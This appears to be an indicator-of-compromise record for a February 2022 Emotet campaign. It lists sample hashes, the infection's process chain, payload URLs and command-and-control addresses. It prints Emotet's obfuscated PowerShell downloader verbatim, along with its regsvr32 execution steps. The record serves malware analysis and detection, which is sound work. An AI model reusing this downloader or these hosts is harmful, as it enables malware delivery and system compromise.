@@ -1,0 +1,87 @@
+Emotet 2022 - 22.02.2022 - epoch4
+
+************************************************************************************************************
+
+.xls b5c8847b02e96158c039a9ed01fea452df8bfb8ce6fae0fbdb47007e571484d6
+
+.dll c4531347c02ad48f5d1f2471aad72edcbeeda910dd5a0c75e0e9fc4c9d42dc92
+
+
+Exec >>
+
+C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE" "C:\Users\Admin\AppData\Local\Temp\UJ511288041821248.xls
+
+wscript c:\programdata\bbiwjdf.vbs
+
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -command "$ghkid=('$MJXdfshDrfGZses4=\"http:dhjdhjwearsweetbomb.comdhjwp-contentdhj15zZybP1EXttxDK4JHdhjbouhttps:dhjdhj1566xueshe.comdhjwp-includesdhjz92ZVqHH8dhjbouhttp:dhjdhjmymicrogreen.mightcode.comdhjFox-CdhjNWssAbNOJDxhsdhjbouhttp:dhjdhjo2omart.co.indhjinfructuosedhjm4mgt2MeUdhjbouhttp:dhjdhjmtc.joburg.org.zadhj-dhjGBGJeFxXWlNbABv2dhjbouhttp:dhjdhjwww.ama.cudhjjprdhjVVPdhjbouhttp:dhjdhjactividades.laforetlanguages.comdhjwp-admindhjdU8Dsdhjbouhttps:dhjdhjdwwmaster.comdhjwp-contentdhj1sR2HfFxQnkWuudhjbouhttps:dhjdhjedu-media.cndhjwp-admindhj0JAEdhjbouhttps:dhjdhjiacademygroup.cldhjofficedhjG42LJPLkldhjbouhttps:dhjdhjznzhou.topdhjmodedhj0Qbdhj\" -sPLIt \"bou\"; foReACh($yIdsRhye34syufgxjcdf iN $MJXdfshDrfGZses4){$GweYH57sedswd=(\"ciuwd:iuwd\priuwdogiuwdramiuwddatiuwda\oiphilfj.diuwdliuwdl\").rePlACe(\"iuwd\",\"\");inVOke-weBrEqUesT -uRI $yIdsRhye34syufgxjcdf -oUtFIle $GweYH57sedswd;iF(teSt-pATh $GweYH57sedswd){if((gEt-itEm $GweYH57sedswd).leNGth -ge 47523){bReak;}}}').replace(\"dhj\",\"/\");iex $ghkid"
+
+C:\Windows\System32\cmd.exe" /c start /B c:\windows\syswow64\regsvr32.exe /s c:\programdata\oiphilfj.dll
+
+\??\c:\windows\syswow64\regsvr32.exe
+
+c:\windows\syswow64\regsvr32.exe  /s c:\programdata\oiphilfj.dll
+
+C:\Windows\SysWOW64\regsvr32.exe /s "C:\Windows\SysWOW64\Ntetq\kmlysgkrktii.hwz"
+
+.dll drops
+
+http://wearsweetbomb.com/wp-content/15zZybP1EXttxDK4JH/
+https://1566xueshe.com/wp-includes/z92ZVqHH8/
+http://mymicrogreen.mightcode.com/Fox-C/NWssAbNOJDxhs/
+http://o2omart.co.in/infructuose/m4mgt2MeU/
+http://mtc.joburg.org.za/-/GBGJeFxXWlNbABv2/
+http://www.ama.cu/jpr/VVP/
+http://actividades.laforetlanguages.com/wp-admin/dU8Ds/
+https://dwwmaster.com/wp-content/1sR2HfFxQnkWuu/
+https://edu-media.cn/wp-admin/0JAE/
+https://iacademygroup.cl/office/G42LJPLkl/
+https://znzhou.top/mode/0Qb/
+
+
+c2's
+
+175.107.196.192:80
+156.67.219.84:7080
+159.8.59.82:8080
+119.235.255.201:8080
+31.24.158.56:8080
+212.237.17.99:8080
+45.118.135.203:7080
+45.176.232.124:443
+129.232.188.93:443
+58.227.42.236:80
+162.214.50.39:7080
+176.104.106.96:8080
+153.126.203.229:8080
+162.243.175.63:443
+138.185.72.26:8080
+50.116.54.215:443
+50.30.40.196:8080
+178.79.147.66:8080
+203.114.109.124:443
+82.165.152.127:8080
+79.172.212.216:8080
+103.134.85.85:80
+178.128.83.165:80
+216.158.226.206:443
+103.75.201.2:443
+51.254.140.238:7080
+45.142.114.231:8080
+107.182.225.142:8080
+81.0.236.90:443
+46.55.222.11:443
+164.68.99.3:8080
+185.157.82.211:8080
+131.100.24.231:80
+212.24.98.99:8080
+217.182.143.207:443
+212.237.56.116:7080
+45.118.115.99:8080
+158.69.222.101:443
+207.38.84.195:8080
+41.76.108.46:8080
+173.212.193.249:8080
+103.75.201.4:443
+195.154.133.20:443
+110.232.117.186:8080
+
